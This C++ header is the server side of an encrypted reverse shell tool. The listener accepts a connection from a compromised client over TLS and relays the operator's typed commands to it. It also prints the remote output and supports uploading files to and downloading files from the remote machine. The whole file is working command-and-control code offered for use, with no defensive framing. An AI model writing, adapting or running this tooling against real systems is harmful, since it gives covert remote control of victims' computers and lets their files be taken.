#ifndef ENCRYPTED_REV_SHELL_SERVER_UTILS_H
#define ENCRYPTED_REV_SHELL_SERVER_UTILS_H

#include "utils.h"


// server specific functions
inline fileTransfer s_parseCommand(char* inputCommand) {

    fileTransfer transferCfg;
    std::string inputStr = toLower(inputCommand);

    if (inputStr.find("upload") != std::string::npos) {
        transferCfg.type = "upload";
    }
    else if (inputStr.find("download") != std::string::npos) {
        transferCfg.type = "download";
    }
    else {
        transferCfg.type = "err";
    }
    // command will be ttyBuffer
    // delete useless information
    // return filePath to file wanting to upload

    // ttyBuffer will look like this =
    // "upload localFile remoteFile\nCONSOLE----"
    // need to extract localFile and remoteFile


    unsigned int newLinePos = inputStr.find("\n"); // first get everything before the newline

    std::string tmpStr = inputStr.substr(0, newLinePos);

    // tmpStr is now "upload /myfile/file.bin"
    // we now need to just extract everthing after "upload "
    // which we can do by just finding where the space is

    unsigned int spacePos;
    // suggesting user supplied no arguments
    if (tmpStr.find(' ') == std::string::npos) {
        std::cout << "[!] Usage: " << transferCfg.type << " local_file_to_read " << "remote_path_to_write" << std::endl;
        return transferCfg;
    }
    else {
        spacePos = tmpStr.find(' ');
    }

    // everthing after 'download '
    std::string afterSpace = tmpStr.substr(spacePos + 1);


    // afterSpace = 'localFile remoteFile'
    // unable to find another space, suggesting the user only provided one argument
    if (afterSpace.find(' ') == std::string::npos) {
        std::cout << "[!] Usage: " << transferCfg.type << " local_file_to_read " << "remote_path_to_write" << std::endl;
        return transferCfg;
    }
    else {
        spacePos = afterSpace.find(' ');
        transferCfg.pathToRead = afterSpace.substr(0, spacePos);
    }

    std::string trailingArgs = afterSpace.substr(spacePos + 1);

    if (trailingArgs.find(' ') == std::string::npos) {
        transferCfg.pathToWrite = afterSpace.substr(spacePos + 1);
    }
    else {
        std::cout << "[!] Usage: " << transferCfg.type << " local_file_to_read " << "remote_path_to_write" << std::endl;
        return transferCfg;
    }

    return transferCfg;
}

inline void s_prepareClientToDownload(SSL* ssl, const std::string& command, const std::string& pathToRead, const std::string& pathToWrite) {
    SSL_write(ssl, command.c_str(), command.size());

    SSL_write(ssl, pathToRead.c_str(), pathToRead.size());

    SSL_write(ssl, pathToWrite.c_str(), pathToWrite.size());
}

inline void s_configureServerCtx(SSL_CTX* ctx) {
    // load the cert and private key
    if (SSL_CTX_use_certificate_file(ctx, "server.crt", SSL_FILETYPE_PEM) <= 0
        || SSL_CTX_use_PrivateKey_file(ctx, "server.key", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
        }
}

inline void server(const std::string &serverIpAddr, unsigned int portNum) {
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (serverSocket < 0) {
        std::cout << "Failed to create server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET; // define IPV4
    serverAddr.sin_port = htons(portNum); // set port, htons coverts port to byte order
    serverAddr.sin_addr.s_addr = inet_addr(serverIpAddr.c_str()); // listen on any available IP (allow further config?)

    // check bind is okay
    if (bind(serverSocket, reinterpret_cast<struct sockaddr *>(&serverAddr), sizeof(serverAddr)) < 0) {
        std::cout << "Failed to bind server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    // check we can listen on bind
    if (listen(serverSocket, 5) < 0) {
        std::cout << "Failed to listen on server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    std::cout << "[+] Server listening on " << serverIpAddr << ":" << portNum << std::endl;

    // get info on connecting client
    struct sockaddr_storage clientAddr{};
    socklen_t clientAddrLen = sizeof(clientAddr);
    char clientIpAddr[INET_ADDRSTRLEN];

    OPENSSL_init_ssl(0, nullptr);

    int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);

    // get some info for server user
    auto *s = reinterpret_cast<struct sockaddr_in *>(&clientAddr);
    int clientPort = ntohs(s->sin_port); // converts byte to port number
    inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr
    std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;

    SSL_CTX* ctx = createSSLCtx();
    s_configureServerCtx(ctx);

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, clientSocket);

    if (SSL_accept(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    } else {
        std::cout << "[+] TLS handshake successful!\n" << std::endl;
    }

    // check we were able to accept connection from client
    if (clientSocket < 0) {
        safeShutdown("[!] Failed To Accept Incoming Connection!", serverSocket, clientSocket, ssl, ctx);
    }

    fd_set fdSet;
    char ttyBuffer[4096];
    fileTransfer transferCfg;
    while (true) {
        // setting up select() func
        FD_ZERO(&fdSet);
        FD_SET(clientSocket, &fdSet); // data from client
        FD_SET(STDIN_FILENO, &fdSet); // data from stdin

        int maxFd = std::max(clientSocket, STDIN_FILENO) + 1;
        // see if we are getting any data from the client or from our own stdin
        int activity = select(maxFd, &fdSet, nullptr, nullptr, nullptr);

        if (activity < 0 ) {
            break;
        }

        // Data from client -> server
        if (FD_ISSET(clientSocket, &fdSet)) {
            // read incoming data
            ssize_t bytesReceived = SSL_read(ssl, ttyBuffer, sizeof(ttyBuffer));
            std::string tmpStr(ttyBuffer, bytesReceived);
            // if no data, client has disconnected and we can exit
            if (bytesReceived <= 0) {
                std::cout << "[!] Client disconnected" << std::endl;
                break;
            }
            if (tmpStr.find("download") != std::string::npos) {

                char pathToWrite[4096];
                SSL_read(ssl, &pathToWrite, sizeof(pathToWrite));
                std::vector<std::byte> incomingFile = handleIncomingFile(ssl, transferCfg.pathToRead);

                if (!incomingFile.empty()) {
                    writeBytesToFile(incomingFile, std::string(pathToWrite));
                    std::cout << "[+] Downloaded file to: " << std::string(pathToWrite) << std::endl;
                    refreshTerminal(ssl);
                }
                else {
                    std::cout << "[!] An error occurred in transmission!" << std::endl;
                }
            }
            else {
                // print output from client
                std::cout.write(ttyBuffer, bytesReceived);
                std::cout.flush();
            }

        }

        // Data from input -> to then send to client
        if (FD_ISSET(STDIN_FILENO, &fdSet)) {
            // read input
            ssize_t input = read(STDIN_FILENO, ttyBuffer, sizeof(ttyBuffer));

            if (input > 0) {
                // if input is 'exit' we know we want to quit
                std::string inputCmd(ttyBuffer, input);

                if (inputCmd.find("exit") != std::string::npos) {
                    // execute shutdown
                    safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket, ssl, ctx);
                }
                else if (inputCmd.find("upload") != std::string::npos) {

                    transferCfg = s_parseCommand(ttyBuffer);

                    if (!transferCfg.type.empty() && !transferCfg.pathToRead.empty() && !transferCfg.pathToWrite.empty()) {
                        std::vector<std::byte> fileBuffer = readFileAsByteVector(transferCfg.pathToRead);

                        transferFile(ssl, fileBuffer, transferCfg.type, transferCfg.pathToRead, transferCfg.pathToWrite);
                    }
                }
                else if (inputCmd.find("download") != std::string::npos) {

                    // Send download to client with local file on client machine, and path to write on this machine
                    // wait for a response that contains (fileBytes)

                    transferCfg = s_parseCommand(ttyBuffer);

                    if (!transferCfg.type.empty() && !transferCfg.pathToRead.empty() && !transferCfg.pathToWrite.empty()) {
                        s_prepareClientToDownload(ssl, transferCfg.type, transferCfg.pathToRead, transferCfg.pathToWrite);
                    }
                }
                else {
                    // if not 'exit' send to client
                    SSL_write(ssl, ttyBuffer, input);
                }

            }
        }
    }

    SSL_free(ssl);
    SSL_CTX_free(ctx);

    close(clientSocket);
    close(serverSocket);
}


#endif //ENCRYPTED_REV_SHELL_SERVER_UTILS_H